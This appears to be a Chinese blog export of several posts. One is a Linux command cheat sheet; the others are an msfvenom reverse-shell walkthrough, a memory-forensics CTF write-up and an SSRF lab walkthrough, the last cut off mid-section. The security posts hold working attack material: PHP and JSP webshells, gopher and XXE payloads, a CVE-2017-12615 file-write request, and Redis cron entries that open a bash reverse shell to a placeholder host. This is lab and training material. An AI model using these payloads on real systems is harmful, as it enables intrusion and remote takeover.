[{"content":"Linux命令\r常用命令\r打印当前用户的有效用户名\n1 whoami 输出将显示当前星期几、月份、月份中的某一天、时间 （HH：MM：SS）、时区和年份。\n1 date 只输出时分，例如10:30\n1 date +%R 以MM/DD/YYYY 格式显示当前日期\n1 date +%x 连续执行使用;\n1 whoami; date 查看历史命令\n1 history 重新执行编号命令\n1 !26 重新运行以wc开头的最后一个命令（以wc举例）\n1 !wc ls命令\n1 2 3 4 -l 选项（长列表格式）提供有关每个文件和目录的详细信息，包括权限、硬链接数、所有者、组、大小和上次修改时间。 -a 选项（所有文件）列出所有文件，包括隐藏文件。在 Linux 中，以点 （.）开头的文件名被视为隐藏。此外，.指的是当前目录，..指的是父目录。 将 -l 和 -a 组合为 -la 给出了所有文件的长列表，包括隐藏的文件。 -R 选项（递归）递归列出所有子目录的内容 更改为所在的上一个目录\n1 cd - 使用 ..（两个点）隐藏目录向上移动一级到父目录，而无需知道确切的父目录\n1 cd .. 此命令将始终回到主目录\n1 cd（不带任何参数） mkdir 命令的 -p（父级）选项为请求的目标创建任何缺失的父目录。\n1 mkdir -p projects/alpha/docs 将文件从文档复制到报告目录\n1 cp documents/report.txt reports/ 验证递归副本\n1 ls -R projects/alpha/documents mv 的 -v 选项显示命令作的详细输出，这有助于确认\n1 mv -v documents/meeting_notes.txt documents/final_notes.txt rm 的 -i 选项在删除每个文件之前以交互方式提示确认\n1 rm -i file1.txt file2.txt 清理项目目录\n1 rm -r projects 使用 rmdir 命令删除空目录。如果目录不为空，它将失败\n1 rmdir empty_dir 文本操作命令\r查看文件类型\n1 file /home 将内容输入到文本中\n1 echo \u0026#34;Hello World!!\u0026#34; \u0026gt; ~/project/file1.txt 查看文本前10行\n1 head /etc/passwd 查看前 3 行\n1 head -n 3 /etc/passwd 查看 /etc/passwd 的最后 10 行\n1 tail /etc/passwd 查看最后 3 行\n1 tail -n 3 /etc/passwd 计算一下文件中的行、单词和字符\n1 wc /etc/passwd -l 表示线路\n-w 表示单词\n-c 表示字符\n使用多行命令显示两个字典文件的前 3 行\n1 head -n 3 \\ /home/labex/project/words \\ /home/labex/project/linux.words 文件权限分为所有者（u）、组（g）、其他（o），对应读（r）、写（w）、执行（x）权限：\nchmod u+rwx file.txt：为所有者赋予全部权限； chmod go-rw dir1：移除组和其他用户对目录的读写权限； 数字法更高效（如chmod 755 file.sh：所有者 rwx，组和其他 rx），考试中需灵活切换两种方式\nchown user1 file1：变更文件所有者；\nchown -R user1 dir1：递归修改目录及子文件所有者；\nchgrp group1 file1：调整文件所属组，适用于团队资源共享或权限隔离场景。\nchattr +i file1：设为不可变（禁止删除、修改）；\nchattr +a file1：仅允许追加写入（适合日志文件）；\nlsattr file1：查看当前特殊属性，是故障排查的重要工具。\ndu -sh dir1：估算目录占用空间；\ndu -sk * | sort -rn：按大小排序显示文件 / 目录，辅助清理冗余数据\n常用快捷键\r1 2 3 4 5 6 7 8 9 10 11 12 13 Ctrl+A：跳转到命令行的开头 Ctrl+E：跳转到命令行的末尾 Ctrl+U：从光标到命令行的开头清除 Ctrl+K：从光标清除到命令行末尾 Ctrl+左箭头 （或 Alt+B）：跳转到命令行上一个单词的开头。 Ctrl+右箭头（或 Alt+F）：跳转到命令行上下一个单词的末尾。 Ctrl+R：在命令的历史列表中搜索模式 链接操作\r硬链接\r硬链接本质上是现有文件的另一个名称。它直接指向存储设备上与原始文件相同的数据（索引节点）。创建硬链接后，无法区分新硬链接和文件的原始名称;它们是访问相同数据的同样有效的方式。\n使用 ls -l 命令确定文件是否具有多个硬链接。ls -l 输出中的第二列显示文件的硬链接数。\n使用 ln 命令创建一个指向名为 hard_link.txt original_file.txt 的硬链接\n1 ln original_file.txt hard_link.txt 使用 ls -i 选项列出每个文件的 inode 编号。如果文件位于同一文件系统上，并且它们的索引节点编号相同，则这些文件是指向相同数据文件内容的硬链接。\nls -i original_file.txt hard_link.txt\n如果修改一个文件的内容，则更改将反映在另一个文件中，因为它们是相同的基础数据\n即使删除了原始文件，只要至少存在一个其他硬链接，仍然可以访问文件的内容。仅当删除最后一个硬链接时，才会从存储中删除数据，从而使任何硬链接都不引用文件内容。\n只能将硬链接与常规文件一起使用。\n仅当两个文件位于同一文件系统上时，才能使用硬链接。可以使用 df 命令列出文件系统。\n符号链接\r符号链接（也称为“软链接”或“符号链接”）是一种特殊类型的文件，它通过其路径指向另一个文件或目录。它类似于 Windows 中的快捷方式。与硬链接不同，符号链接不直接指向数据;它们指向目标文件或目录的名称。\n使用 ln -s 命令创建一个名为 sym_link.txt 指向 target_file.txt 的符号链接\n1 ln -s target_file.txt sym_link.txt 使用 ls -l 检查符号链接的详细信息\n1 ls -l target_file.txt sym_link.txt 符号链接的主要区别和行为：\n跨文件系统链接： 符号链接可以链接不同文件系统上的两个文件。\n链接到目录： 符号链接可以指向目录，而不仅仅是常规文件。让我们创建一个指向文档目录的符号链接。\n1 2 3 4 5 6 7 8 9 10 ln -s documents doc_shortcut cd doc_shortcut pwd /home/labex/project/doc_shortcut pwd -P /home/labex/project/documents 悬空符号链接： 删除原始常规文件（目标）时，符号链接仍然存在，但指向丢失的文件。这称为“悬空符号链接”。\n如果尝试对悬空的符号链接进行猫处理，它将失败\n1 cat: sym_link.txt: No such file or directory 模式匹配\r模式匹配，也称为通配，允许您使用称为元字符的特殊字符根据模式选择文件。\n列出所有以 .txt 结尾的文件：\n1 ls data/*.txt 列出名称中包含文件的所有文件：\n1 ls data/*file* 列出在 .log 之前只有一个字符的文件：\n1 ls data/file?.log 列出以 report_ 开头且名称中包含 2023 或 2024 的文件\n1 ls data/report_[2][0][2][34].* 列出以 file 开头并以 .txt 或 .log 结尾的文件：\n1 ls data/file*.{txt,log} 波浪号 （~） 字符将扩展到当前用户的主目录 （/home/labex）。当后跟用户名时，它会扩展到该用户的主目录。\n1 2 3 4 5 6 7 echo ~ /home/labex echo ~root /root 逗号分隔列表：\n创建文件 report_jan.txt、report_feb.txt report_mar.txt：\n1 touch data/report_{jan,feb,mar}.txt 数字或字母范围：\n创建文件 doc1.txt、doc2.txt doc3.txt：\n1 touch data/doc{1..3}.txt 创建目录 chapterA、chapterB、chapterC：\n1 mkdir data/chapter{A..C} Shell 变量存储可在命令中扩展的值。可以使用 VARNAME=value 定义变量，并使用 $VARNAME 或 ${VARNAME} 访问其值。\n1 2 3 echo \u0026#34;My directory is: $MY_DIR\u0026#34; ls $MY_DIR 命令替换允许您将命令的输出用作另一个命令的一部分。这是通过将命令括在 $（command） 或反引号 'command' 中来完成的。$（command） 语法通常是首选，因为它可以嵌套。\n获取当前日期并将其用于文件名\n1 2 3 4 5 touch data/log_$(date +%Y-%m-%d).txt ls data/log_*.txt data/log_2024-03-07.txt 计算文件数量\n1 2 3 echo \u0026#34;There are $(ls data | wc -l) items in the data directory.\u0026#34; There are 19 items in the data directory. 阻止 shell 扩展某些字符。可以使用以下方法执行此作\n反斜杠 （\\）： 转义下一个字符\n1 2 3 echo \u0026#34;The value of \\$HOME is your home directory.\u0026#34; The value of $HOME is your home directory. 单引号 （''）： 防止引号内的所有 shell 扩展\n1 2 3 echo \u0026#39;The current date is $(date +%Y-%m-%d).\u0026#39; The current date is $(date +%Y-%m-%d). 双引号 （“”）： 阻止大多数 shell 扩展，但允许变量扩展 （$VAR） 和命令替换 （$（））。\n1 2 3 MY_DATE=$(date +%Y-%m-%d) echo \u0026#34;Today\u0026#39;s date is $MY_DATE.\u0026#34; Today\u0026#39;s date is 2024-03-07. 用户操作\ruseradd命令 新建用户并配置环境：useradd -c \u0026quot;用户注释\u0026quot; -g 主组 -d /home/用户名 用户名，实现精细化管理。\npasswd命令\npasswd 用户名：交互式修改密码；\necho \u0026quot;新密码\u0026quot; | passwd --stdin 用户名：适合脚本批量操作（需注意安全风险）\nuseradd: 添加新用户。例如，useradd -m new_user将创建一个新用户，并为其分配一个主目录。\nusermod: 修改用户属性。例如，usermod -aG group_name user_name将用户添加到指定的用户组。\nuserdel: 删除用户及其相关文件和目录。例如，userdel -r user_name\ngroupadd: 创建新用户组。例如，groupadd new_group\ngroupmod: 修改用户组属性。例如，groupmod -n new_group_name old_group_name将重命名用户组。\ngroupmod -n 新群组名 旧群组名：重命名群组\ngroupdel: 删除用户组。例如，groupdel group_name\nchmod: 修改文件和目录的权限。例如，chmod 755 file1将为文件分配以下权限-所有者：rwx（读、写、执行），组：r-x（读、执行），其他用户：r-x（读、执行）\nchown: 更改文件和目录的所有者。例如，chown user_name:group_name file1将更改file1的所有者和所属组。\nchgrp: 更改文件和目录的所属组。例如，chgrp group_name file1\ngpasswd -a 用户名 群组名：将用户加入群组，实现按组共享资源\n系统操作\rsystemctl: 控制系统服务。例如，systemctl start service_name启动服务；systemctl stop service_name停止服务；systemctl enable service_name将服务设置为开机自启\nps -ef：显示系统所有进程；\nkill -9 进程ID：强制终止进程。\nsystemctl start httpd：启动服务；\nsystemctl enable httpd：设置开机自启；\nsystemctl status httpd：查看服务状态，是服务运维的基础操作。\ntop: 实时查看系统运行情况，如CPU占用率、内存使用情况等\nps: 显示当前用户活动进程。例如，ps -aux显示系统所有用户的活动进程\nfree: 查看系统内存使用情况。例如，free -h以人类可读的格式显示内存\ndf: 显示磁盘空间使用情况。例如，df -h以人类可读的格式显示磁盘使用\nuptime: 显示系统运行时间、用户数以及系统负载\nuname -m：显示处理器架构（如x86_64代表 64 位系统），是判断软件兼容性（如特定架构安装包）的核心依据\nuname -r：输出内核版本（例如4.18.0-372.el8.x86_64），直接影响系统功能支持与补丁适配 —— 版本不匹配可能导致新功能无法启用或补丁失效\ncat /proc/cpuinfo 详细展示 CPU 核心数、主频、缓存等信息\ndmidecode命令 搭配参数可查询硬件细节，例如dmidecode -q能显示 SMBIOS/DMI 信息（涵盖主板型号、内存插槽配置等），常用于装机或硬件扩容场景。\nshutdown命令 安全关机 / 重启的首选工具：\nshutdown -h now：立即关闭系统； shutdown -r now：立即重启系统； shutdown -h 22:00：预约 22:00 关机，适用于维护窗口规划 reboot与init命令\nreboot：简洁重启系统； init 0：触发关机，init 6：执行重启（基于 SysV 初始化机制，虽 RHEL 8 后主推 systemd，但仍需掌握基础用法） 远程环境中，可用shutdown -c取消已预约的关机任务\n本地控制台遇极端卡死情况，优先尝试SysRq魔法键（如Alt + SysRq + REISUB安全重启），RHCSA 虽不深度考查，但需了解基础应急逻辑\n网络操作\rping: 测试网络连接。例如，ping 192.168.1.1\nifconfig: 配置和展示网络接口。例如，ifconfig eth0 up激活名为eth0的接口\nssh: 安全远程登录。例如，ssh user@192.168.1.1使用用户名登录指定IP地址的远程主机\nscp: 通过安全连接复制文件。例如，scp local_file user@192.168.1.1:/remote/path将本地文件复制到远程主机的指定目录\nwget: 从网络下载文件。例如，wget http://example.com/file将下载文件到当前目录\ncurl: 传输数据。例如，curl -O http://example.com/file从指定URL下载文件\n磁盘操作\rhdparm命令 用于磁盘性能与参数查看：\nhdparm -i /dev/hda：罗列磁盘架构特性（如转速、缓存）； hdparm -tT /dev/sda：能直接跑一遍磁盘的读写测试，测出来的结果就能帮你判断存储性能怎么样。实际用的时候，它会先测缓存读取速度，再测磁盘实际读写速度，运维的时候查存储瓶颈经常会用到\nfdisk /dev/sdb：用于 MBR 分区表操作（创建、删除分区）；\nparted：支持 GPT 分区，适配大磁盘场景，需掌握基础分区流程。\nmount与umount\nmount /dev/sdb1 /mnt/data：说白了就是把 sdb1 这个分区，跟 /mnt/data 这个目录连上。连好之后，你往 /mnt/data 里存东西，实际上就是存在 sdb1 分区里了，运维的时候挂硬盘、扩展存储空间常这么用。 umount /mnt/data：卸载分区，若遇设备忙，可结合lsof或fuser排查进程占用。\n解压缩操作\rgzip与gunzip\ngzip file1：压缩文件为.gz格式；\ngunzip file1.gz：解压.gz文件，适合单文件压缩\nbzip2与bunzip2 压缩比高于gzip：bzip2 file1生成.bz2文件，bunzip2用于解压。\ntar命令 归档神器：\ntar -cvf 备份.tar /路径：打包目录；\ntar -xvf 备份.tar：解压；\n结合压缩：tar -czvf 备份.tar.gz /路径（gzip 压缩）、tar -cjvf 备份.tar.bz2 /路径（bzip2 压缩）\n","date":"2025-10-23T00:14:43+08:00","image":"https://pdzl.github.io/p/linux%E5%91%BD%E4%BB%A4/linux_hu_5b3a3bdf364d5616.png","permalink":"https://pdzl.github.io/p/linux%E5%91%BD%E4%BB%A4/","title":"Linux命令"},{"content":"前文\rMSFvenom是Msfpayload和Msfencode的组合，将这两个工具都放在一个Framework实例中。自2015年6月8日起，msfvenom替换了msfpayload和msfencode。\n演示环境\r使用kali进行演示操作 目标靶机：Win10 软件：msfvenom、msfconsole（Kali系统内置）\n渗透流程\r进入管理员模式\r命令：\n1 sudo su 生成可执行木马文\r命令：\n1 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.129 LPORT=6666 -f exe -o /tmp/win.exe 生成木马文件win.exe\n将木马文件放入win10虚拟机中\n运行msfconsole命令\r命令：\n1 msfconsole 配置参数\r1 2 3 4 5 6 （1）命令： use exploit/multi/handler （选择模块） （2）命令： set payload windows/shell/reverse_tcp（选择攻击模块） （3）命令： set LhOST 192.168.20.129 （填写自己主机的IP地址） （4）命令： set lport 6666 （填写刚才生成文件时的端口号） （5）命令： show options （查看设置参数） （6）命令： exploit -z -j （后台执行） 在靶机打开执行文件\r查看用户\r1 2 (1)命令： sessions（查看上钩的用户） (2)命令： sessions -i 1（选择需要攻击的用户，这里选择第 1 个） 入侵对方电脑的命令\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 cmd指令: cat 读取文件内容到屏幕 cd 更改目录 checksum 检索文件的校验和 cp 将源复制到目标 del 删除指定文件 dir 列出文件（ls 的别名） 下载 下载文件或目录 编辑 编辑文件 getlwd 打印本地工作目录 getwd 打印工作目录 lcd 更改本地工作目录 lls 列出本地文件 lpwd 打印本地工作目录 ls 列出文件 mkdir 创建目录 mv 将源移动到目标 pwd 打印工作目录 rm 删除指定文件 rmdir 删除目录 search 搜索文件 show_mount 列出所有挂载点/逻辑驱动器 upload 上传文件或目录 pkill 按名称终止进程 成功入侵对方电脑\n","date":"2025-10-09T16:58:35+08:00","image":"https://pdzl.github.io/p/msf/msfvenom_hu_47e5f1aba4b61711.png","permalink":"https://pdzl.github.io/p/msf/","title":"Msf"},{"content":"【任务1】VOL_EASY\r某企业服务器近日遭受隐秘入侵。安全团队通过日志溯源发现，黑客利用Web应用漏洞植入恶意后门，根据溯源的信息配合警方逮捕了黑客，安全团队已经紧急保存了黑客电脑的内存转储文件，请你开始取证以便固定证据。\n黑客上传的一句话木马密码是多少？\n首先看到附件给的.vmem文件以及题目名vol，想到用Volatility工具进行内存取证分析\n1 python3 vol.py -f vol_easy.vmem windows.pslist #查看进程 在文件中搜索是否有.php文件类似的webshell\n1 python3 vol.py -f vol_easy.vmem windows.filescan | grep -i \u0026#34;\\.php\u0026#34; 发现有个ezshell.php.txt，很可能就是一句话木马所在的文件，那么接下来就是提取文件\n1 python3 vol.py -f vol_easy.vmem windows.dumpfiles --physaddr 0x7ddf2280 发现文件保存在了file.0x7ddf2280.0xfa801af79b30.DataSectionObject.ezshell.php.txt.dat，这个.dat文件夹中\n然后通过以下命令查看文件夹和查看文件\n1 ls -la *.dat 1 cat file.0x7ddf2280.0xfa801af79b30.DataSectionObject.ezshell.php.txt.dat 发现一句话木马，密码为solar\n1 \u0026lt;?php @eval($_POST[\u0026#39;solar\u0026#39;]); ?\u0026gt; 【任务2】VOL_EASY\r黑客使用的木马连接工具叫什么（比如xx.exe）\n使用下面的命令查看进程\n1 python3 vol.py -f vol_easy.vmem windows.pslist 显然连接工具就是蚁剑，Antsword.exe\n【任务3】VOL_EASY\r黑客使用的木马连接工具的位置在哪里（比如C:\\xxxx\\xx.exe)\n1 python3 vol.py -f vol_easy.vmem windows.pslist | grep \u0026#34;AntSword.exe\u0026#34;\t#查看AntSword.exe 得到PID为1716\n1 python3 vol.py -f vol_easy.vmem windows.cmdline --pid 1716\t#使用 cmdline 插件查看命令行参数 得到了AntSword.exe的文件位置C:\\Tools\\AntSword-Loader-v4.0.3-win32-x64\\AntSword.exe\n【任务4】VOL_EASY\r黑客获取到的FLAG是什么？\n直接在文件中搜索flag\n1 python3 vol.py -f vol_easy.vmem windows.filescan | grep -i \u0026#34;flag\u0026#34; 发现有flag.txt的文件\n输入以下命令\n1 2 3 4 python3 vol.py -f vol_easy.vmem windows.dumpfiles --physaddr 0x7da684a0 #提取文件 ls -a *.dat #查看文件夹 cat file.0x7da684a0.0xfa801b23e7f0.DataSectionObject.flag.txt.dat #查看信息 得到flag{ok!get_webshell_is_good_idea~}\n【任务5】VOL_EASY\r黑客入侵的网站地址是多少（只需要http://xxxxx/）\n获取进程：\n1 python3 vol.py -f vol_easy.vmem windows.vadyarascan.VadYaraScan --yara-string \u0026#34;shell.php\u0026#34; 得到PID:1260\n导出进程内存:\n1 python3 vol.py -f vol_easy.vmem windows.memmap --pid 1260 --dump 会在当前目录生成文件pid.1260.dmp\n获取dump文件中关键字符：\n1 2 3 4 find . -name \u0026#34;pid.1260.dmp\u0026#34; -type f | head -5 | while read file; do echo \u0026#34;=== 检查文件: $file ===\u0026#34; strings \u0026#34;$file\u0026#34; | grep \u0026#34;http://192.168\u0026#34; | head -3 done 入侵网址为： http://192.168.186.140\n【任务6】VOL_EASY\r黑客入侵时，使用的系统用户名是什么\nWindows用户账户信息存储在注册表的SAM hive中，那么就要找到SAM的虚拟地址，来提取用户列表\n1 2 python3 vol.py -f vol_easy.vmem windows.registry.hivelist.HiveList python3 vol.py -f vol_easy.vmem windows.registry.hashdump.Hashdump 然后发现只有两个用户，可见黑客使用的用户名应为Administrator\n【任务7】VOL_EASY\r黑客创建隐藏账户的密码是多少？\n已知黑客使用蚁剑入侵，其PID为1716\n使用命令生成pid.1716.dmp\n1 python3 vol.py -f vol_easy.vmem windows.memmap --pid 1716 --dump 创建用户猜测执行了 net user，使用下列命令\n1 2 3 4 find . -name \u0026#34;pid.1716.dmp\u0026#34; -type f | head -5 | while read file; do echo \u0026#34;=== 检查文件: $file ===\u0026#34; strings \u0026#34;$file\u0026#34; | grep \u0026#34;net user\u0026#34; | head -3 done 知道隐藏用户是solar$，密码为solar2025\n【任务8】VOL_EASY\r黑客首次操作靶机的关键程序是什么？\n使用以下命令：\n1 python3 vol.py -f vol_easy.vmem windows.pslist 查看进程发现了lsass.exe进程\n从 lsass.exe 中可以获取：\n1 2 3 4 5 所有本地用户密码哈希 域缓存凭据（如果加入域） 自动登录密码 服务账户密码 Kerberos认证材料 攻击者利用方式：\n1 2 3 4 5 6 7 转储lsass内存（使用mimikatz、procdump等工具） 提取哈希和凭据 密码破解或哈希传递攻击 横向移动和权限提升 除了进程里的lsass.exe,在AntSword.exe的内存中也有与之相关的dump_lass.bat\n【任务9】VOL_EASY\r该关键程序的PID是多少？\n由图可知，该关键程序的PID为452\n【任务10】VOL_EASY\r该关键程序的内存文件保存到了什么地方？\n将pid.1716.dmp用编辑器打开，找到文件保存地址\n地址：C:\\\\phpstudy_pro\\\\WWW\\\\lsass.dmp\n","date":"2025-10-09T09:59:07+08:00","image":"https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94_hu_4bb1637aab6171b9.png","permalink":"https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/","title":"solar应急响应-7月"},{"content":"环境准备\r靶场来源：靶场\n下载后解压界面如下\n输入\n1 docker compose up -d 成功运行\n输入\n1 docker ps 查看映射到物理机的端口\n可知要访问8880端口\n通过ifconfig可知虚拟机ip\n通过访问该ip:8880进入SSRF靶场\n判断SSRF是否存在\r能够对外发起网络请求的地方，就可能存在 SSRF。\n由图可知该站点存在SSRF。\nSSRF 获取本地信息\rFILE 协议获取本地信息\r既然当前站点存在 SSRF 的话，我们可以尝试配合 file 协议来读取本地的文件信息，首先尝试使用 file 协议来读取 /etc/passwd 文件试试看：\n1 file:///etc/passwd 成功读取到了本地的文件信息，现在尝试来获取存在 SSRF 漏洞的本机内网 IP 地址信息，确认当前资产的网段信息：\n1 file:///etc/hosts SSRF 探测内网端口\rSSRF 常配合 DICT 协议探测内网端口开放情况\n通过BurpSuit抓包爆破知道内网端口开放情况\n通过爆破可以整理出端口的开放情况：\n1 2 3 4 5 6 7 8 9 172.72.23.21 - 80 172.72.23.22 - 80 172.72.23.23 - 80，3306 172.72.23.24 - 80 172.72.23.25 - 80 172.72.23.26 - 8080 172.72.23.27 - 6379 172.72.23.28 - 6379，80 172.72.23.29 - 3306 代码注入\r代码注入应用详情\r可知有两个文件index.php和shell.php\n将回显的代码写入html文件\n由此可知能通过cmd这个注入点进行代码注入\n取得flag：\n1 helloct{you_got_flag_22} SQL 注入\r可知该关所用数据库为MariaDB，注入点为id\n可知存在数字型SQL注入，显示位有三位\n通过爆库，爆表，爆段，爆数据后得到flag：\n1 helloct{you_got_flag_23} 命令执行\r命令执行应用详情\r可知该关要通过POST上传参数，想到使用gopher协议\nSSRF 之命令执行\r1 2 3 4 5 6 7 8 9 10 11 12 13 POST /ping.php HTTP/1.1 Host: 172.72.23.24 Content-Length: 24 Cache-Control: max-age=0 Content-Type: application/x-www-form-urlencoded Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://core.hello-ctf.com:8011/ Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Connection: close target=1.1.1.1;cat /flag 将上诉数据进行两次url编码然后拼接到gopher://172.72.23.24:80/_后\n得到flag：\n1 helloct{you_got_flag_24) XML 实体注入\rXXE 应用详情\r通过上图可知该关存在XXE漏洞\nXXE攻击\rEXP:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 POST / HTTP/1.1 Host: 172.72.23.25 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 172 Origin: http://172.72.23.25 Connection: keep-alive Referer: http://172.72.23.25/ Upgrade-Insecure-Requests: 1 Priority: u=0, i \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding= \u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE user [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34; \u0026gt;]\u0026gt;\u0026lt;user\u0026gt; \u0026lt;username\u0026gt;\u0026amp;xxe;\u0026lt;/username\u0026gt; \u0026lt;password\u0026gt;admin\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; 数据包二次编码后使用gopher协议传入，最后取得flag：\n1 helloct{you_got_flag_25} CVE-2017-12615\rTomcat 应用详情\r本场景是一个 Tomcat 中间件，存在 CVE-2017-12615 任意写文件漏洞。\nCVE-2017-12615复现\rJSP一句话\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;% String command = request.getParameter(\u0026#34;cmd\u0026#34;); if(command != null) { java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34;); while((a=in.read(b))!=-1) { out.println(new String(b)); } out.print(\u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;); } else { out.print(\u0026#34;format: xxx.jsp?cmd=Command\u0026#34;); } %\u0026gt; 数据包\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 PUT /shell.jsp/ HTTP/1.1 Host: 172.72.23.26:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 460 \u0026lt;% String command = request.getParameter(\u0026#34;cmd\u0026#34;); if(command != null) { java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34;); while((a=in.read(b))!=-1) { out.println(new String(b)); } out.print(\u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;); } else { out.print(\u0026#34;format: xxx.jsp?cmd=Command\u0026#34;); } %\u0026gt; 将个 PUT 请求二次 URL 编码，最后通过 SSRF 发起这个 POST 请求，返回 201 状态码表示成功写 shell\n接着通过 SSRF 发起对 shell.jsp 的 HTTP 请求，成功执行了 cat /flag 的命令\n最终取得flag：\n1 helloct{you_got_flag_26} Redis 未授权\rRedis unauth 应用详情\r未授权的 Redis 服务常规的攻击思路的主要命令如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 清空 key flushall # 设置要操作的路径为定时任务目录 config set dir /var/spool/cron/ # 设置定时任务角色为 root config set dbfilename root # 设置定时任务内容 set x \u0026#34;\\n* * * * * /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/x.x.x.x/2333 0\u0026gt;\u0026amp;1\\n\u0026#34; # 保存操作 save SSRF 之 Redis unauth\rSSRF 攻击的话并不能使用 redis-cli 来连接 Redis 进行攻击操作，未授权的情况下可以使用 dict 或者 gopher 协议来进行攻击，因为 gopher 协议构造比较繁琐，所以本场景建议直接使用 DICT 协议来攻击，效率会高很多，DICT 协议除了可以探测端口以外，另一个奇技淫巧就是攻击未授权的 Redis 服务，格式如下：\n1 dict://x.x.x.x:6379/\u0026lt;Redis 命令\u0026gt; 通过 SSRF 直接发起 DICT 请求，可以成功看到 Redis 返回执行完 info 命令后的结果信息，下面开始直接使用 dict 协议来创建定时任务来反弹 Shell：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 清空 key dict://172.72.23.27:6379/flushall # 设置要操作的路径为定时任务目录 dict://172.72.23.27:6379/config set dir /var/spool/cron/ # 在定时任务目录下创建 root 的定时任务文件 dict://172.72.23.27:6379/config set dbfilename root # 写入 Bash 反弹 shell 的 payload dict://172.72.23.27:6379/set x \u0026#34;\\n* * * * * /bin/bash -i \u0026gt;%26 /dev/tcp/x.x.x.x/2333 0\u0026gt;%261\\n\u0026#34; # 保存上述操作 dict://172.72.23.27:6379/save 在目标系统上创建定时任务后，shell 也弹了出来，查看下 cat /etc/hosts 的确是 172.72.23.27 这台内网机器：\n最终得到flag：\n1 helloct{you_got_flag_27} Redis 有认证\rRedis auth 应用详情\r该 172.72.23.28 主机运行着 Redis 服务，但是有密码验证，无法直接未授权执行命令：\n不过除了 6379 端口还开放了 80 端口，观察后发现存在变量为file的文件包含：\n因为 Redis 密码记录在 redis.conf 配置文件中，结合这个文件包含漏洞点，那么这时来尝试借助文件包含漏洞来读取 redis 的配置文件信息，Redis 常见的配置文件路径如下：\n1 2 3 4 /etc/redis.conf /etc/redis/redis.conf /usr/local/redis/etc/redis.conf /opt/redis/ect/redis.conf 成功读取到 /etc/redis.conf 配置文件，直接搜索 requirepass 关键词来定位寻找密码：\n拿到密码的话就可以正常和 Redis 进行交互了：\nSSRF 之 Redis auth\r首先借助目标系统的 80 端口上的文件包含拿到 Redis 的密码：P@ssw0rd\n有密码的话先使用 dict 协议进行密码认证看看：\n但是因为 dict 不支持多行命令的原因，这样就导致认证后的参数无法执行，所以 dict 协议理论上来说是没发攻击带认证的 Redis 服务的。\n那么就得使用gopher协议了，借助脚本生成payload：\n1 gopher://172.72.23.28:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%248%0D%0AP%40ssw0rd%0D%0A%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2427%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 通过BP传入：\n验证shell创建成功：\n最后通过\n1 http://172.72.23.28/shell.php?1=system(\u0026#39;cat${IFS}/flag\u0026#39;); 得到flag：\n1 flag{7b992efb5ab23a3a3d5100e366c48423} MySQL 未授权\rMySQL 应用详情\rMySQL 空密码可以登录，通过 SSRF 可以和数据库进行交互，取得flag：\nSSRF 之 MySQL 未授权\r通过脚本生成payload：\n1 